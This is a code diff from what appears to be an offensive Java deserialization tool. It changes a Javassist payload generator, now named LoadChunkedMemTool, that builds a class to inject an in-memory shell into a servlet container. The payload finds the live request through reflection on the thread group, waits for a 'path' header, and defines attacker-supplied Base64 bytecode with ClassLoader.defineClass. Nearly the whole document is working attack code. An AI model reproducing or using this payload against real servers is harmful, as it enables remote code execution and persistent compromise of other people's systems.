@@ -6,15 +6,13 @@ import javassist.CtClass;
 import javassist.CtMethod;
 import javassist.CtNewConstructor;
 
-
-public class InjectMemTool implements EchoPayload {
-    @Override
-    public CtClass genPayload(ClassPool pool) throws Exception {
-        CtClass clazz = pool.makeClass("com.summersec.x.Test" + System.nanoTime());
-
+public class LoadChunkedMemTool implements EchoPayload {
+    public CtClass genPayload(ClassPool pool, String bytestr) throws Exception {
+        CtClass clazz = pool.makeClass("com.summersec.x.Load" + System.nanoTime());
         if ((clazz.getDeclaredConstructors()).length != 0) {
             clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
         }
+
         clazz.addMethod(CtMethod.make(
                 "    private static Object getFV(Object o, String s) throws Exception {\n" +
                         "        java.lang.reflect.Field f = null;\n" +
@@ -34,14 +32,16 @@ public class InjectMemTool implements EchoPayload {
                         "        return f.get(o);\n" +
                         "    }", clazz));
 
-        clazz.addConstructor(CtNewConstructor.make(
-                "public InjectMemTool() {\n" +
+        String constructorCode =
+                "public LoadChunkedMemTool() {\n" +
                         "    try {\n" +
                         "        Object o;\n" +
                         "        String s;\n" +
-                        "        String user = null;\n" +
                         "        Object resp;\n" +
                         "        boolean done = false;\n" +
+                        "        String base64Str = " + bytestr + ";\n" +
+                        "        String path = null;\n" +
+                        "        byte[] clazzByte = org.apache.shiro.codec.Base64.decode(base64Str);\n" +
                         "\n" +
                         "        Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\");\n" +
                         "        for (int i = 0; i < ts.length; i++) {\n" +
@@ -76,12 +76,12 @@ public class InjectMemTool implements EchoPayload {
                         "                                      .getMethod(\"getNote\", new Class[]{int.class})\n" +
                         "                                      .invoke(o, new Object[]{new Integer(1)});\n" +
                         "\n" +
-                        "                    user = (String) conreq.getClass()\n" +
-                        "                                         .getMethod(\"getParameter\", new Class[]{String.class})\n" +
-                        "                                         .invoke(conreq, new Object[]{new String(\"user\")});\n" +
+                        "                    path = (String) conreq.getClass()\n" +
+                        "                                       .getMethod(\"getHeader\", new Class[]{String.class})\n" +
+                        "                                       .invoke(conreq, new Object[]{new String(\"path\")});\n" +
                         "\n" +
-                        "                    if (user != null && !user.isEmpty()) {\n" +
-                        "                        byte[] bytecodes = org.apache.shiro.codec.Base64.decode(user);\n" +
+                        "                    if (path != null && !path.isEmpty()) {\n" +
+                        "                        byte[] bytecodes = clazzByte;\n" +
                         "\n" +
                         "                        java.lang.reflect.Method defineClassMethod = ClassLoader.class\n" +
                         "                            .getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});\n" +
@@ -102,15 +102,20 @@ public class InjectMemTool implements EchoPayload {
                         "                }\n" +
                         "            }\n" +
                         "        }\n" +
+                        "\n" +
+                        "        for (int i = 0; i <= 25; i++) {\n" +
+                        "              System.setProperty(String.valueOf(i), \"null\");\n" +
+                        "              }\n" +
                         "    } catch (Exception e) {\n" +
                         "        ;\n" +
                         "    }\n" +
-                        "}", clazz));
+                        "}";
+
+        clazz.addConstructor(CtNewConstructor.make(constructorCode, clazz));
         return clazz;
     }
-
     @Override
-    public CtClass genPayload(ClassPool paramClassPool, String bytestr) throws Exception {
+    public CtClass genPayload(ClassPool paramClassPool) throws Exception {
         return null;
     }
 
@@ -119,6 +124,4 @@ public class InjectMemTool implements EchoPayload {
         return null;
     }
 }
-
-
 
